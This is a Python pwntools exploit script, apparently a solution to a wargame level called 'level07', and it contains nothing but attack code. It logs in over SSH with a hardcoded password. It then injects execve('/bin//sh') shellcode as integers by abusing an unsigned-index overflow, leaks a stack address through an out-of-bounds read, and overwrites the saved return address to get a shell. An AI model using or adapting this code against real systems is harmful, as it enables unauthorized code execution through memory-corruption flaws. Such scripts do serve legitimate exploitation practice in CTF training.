from pwn import *

s = ssh('level07', '192.168.1.110', 4242, 'GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8')

r: process = s.process('./level07')

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80'
splits = [shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
shell_ints = [int.from_bytes(piece, 'little') for piece in splits]

uint_max = 4_294_967_295

for i in range(len(shell_ints)):
    index = i
    if not i % 3:
        index += int((uint_max + 1) / 4)
    r.sendline(b'store')
    r.sendline(str(shell_ints[i]).encode())
    r.sendline(str(index).encode())
    print('store')
    print(shell_ints[i])
    print(index)
   
r.sendline(b'read')
r.sendline(str(-9).encode())
r.recvuntil(b'data[')
buf_addr = int(r.recvline().decode().strip().split(' ')[-1])

print('read')
print(-9)

eip_addr = int((uint_max + 1) / 4 + 114)
r.sendline(b'store')
r.sendline(str(buf_addr).encode())
r.sendline(str(eip_addr).encode())

print('store')
print(buf_addr)
print(eip_addr)


r.interactive()

